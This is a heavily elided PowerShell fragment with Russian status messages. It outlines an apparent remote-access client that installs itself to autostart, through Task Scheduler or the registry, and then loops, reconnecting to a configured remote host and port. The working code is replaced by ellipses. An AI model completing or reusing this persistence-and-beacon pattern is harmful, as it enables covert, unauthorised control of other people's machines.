...
if (-not $existing) {
    ...
    if ($isAdmin) {
        ...
        Write-Host "[+] Автозапуск установлен (Планировщик)"
    } else {
        ...
        Write-Host "[+] Автозапуск установлен (реестр)"
    }
} else {
    Write-Host "[*] Автозапуск уже установлен"
}
...
while ($true) {
    try {
        Write-Host "[*] Подключаюсь к ${REMOTE_HOST}:${REMOTE_PORT}..."
        ...
        if ($client.Connected) {
            ...
            Write-Host "[!] Нет соединения"
        }
        $client.Close()
    } catch {
        Write-Host "[!] Ошибка: $_"
    }
    Write-Host "[*] Следующая попытка через $RECONNECT_WAIT сек..."
